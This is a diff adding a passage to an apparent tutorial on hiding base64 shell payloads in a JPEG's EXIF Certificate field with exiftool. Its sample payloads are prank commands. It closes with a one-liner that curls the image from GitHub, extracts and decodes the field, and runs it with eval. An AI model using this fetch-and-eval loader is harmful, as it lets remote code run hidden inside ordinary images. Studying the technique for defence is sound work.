@@ -1004,4 +1004,55 @@ when we use `exiftool` to dump the data we get the following output
 └─────────────╨────────────────────────┴────────────────────────────────────────────────────────┘
 ```
 
-if we go throu
+if we go through the table we cant seem to find the certificate, which is aye okay 😎, we arent always going to find the cert in some jpg images especially if you download it off of the website, or google which can sometimes erase it, however no need to worry we have our trusty dusty EXIFTOOL to update the certificate, now what we will be doing here is taking our base64 encoded payload, injecting it into the certificate and finally updating the image, to do this with exiftool we just type 
+
+`exiftool Certificate=whateverstringis output.jpg` and exif tool will auto update the tool, lets use this with our string, if there is already a payload in the image you can use `exiftool -all= image.jpg` to erase the data in the image and kinda strip it of any payloads which will start with our own, since i tested this before writing about it i have my payload in there which is 
+
+`Certificate                     : dG91Y2ggfi9EZXNrdG9wL2hhY2tlZA==`
+
+so once i enter that command i now get 
+
+```
+ExifTool Version Number         : 12.30
+File Name                       : example.jpg
+Directory                       : .
+File Size                       : 130 KiB
+File Modification Date/Time     : 2022:02:27 09:08:26-05:00
+File Access Date/Time           : 2022:02:27 09:08:26-05:00
+File Inode Change Date/Time     : 2022:02:27 09:08:26-05:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Image Width                     : 800
+Image Height                    : 534
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 800x534
+Megapixels                      : 0.427
+
+```
+
+instead of that major and massive table of data, lets now inplant our string 
+
+
+`exiftool - Certificate='emVuaXR5IC0tbm90aWZpY2F0aW9uIC0tdGV4dD0iV0FSTklORzogWU9VIEhBVkUgQkVFTiBIQUNLRUQgOkQgRElFIERJRSBESUUgRElFIERJRSIgLS10aXRsZT0iVElNRSBJUyBVUCBGVUNLRVJSUlIiIDsgZWNobyAtZW4gIgci' example.jpg`
+
+now this is a bit large but thats okay, when we redump our image we get 
+
+```
+Certificate                     : emVuaXR5IC0tbm90aWZpY2F0aW9uIC0tdGV4dD0iV0FSTklORzogWU9VIEhBVkUgQkVFTiBIQUNLRUQgOkQgRElFIERJRSBESUUgRElFIERJRSIgLS10aXRsZT0iVElNRSBJUyBVUCBGVUNLRVJSUlIiIDsgZWNobyAtZW4gIgci
+```
+
+our injected image is the same but now has the payload 
+
+![im](zip_utils/injected.jpg)
+
+
+this means our code is now injected into the image, now lets make a simple command to filter and execute this data
+
+`p=$(curl -s https://github.com/ArkAngeL43/EXIF-Stegonography-and-image-injection/blob/main/zip_utils/example.jpg | grep Cert -a | sed 's/<[^>]*>//g' | base64 -d);eval $p`
+
+
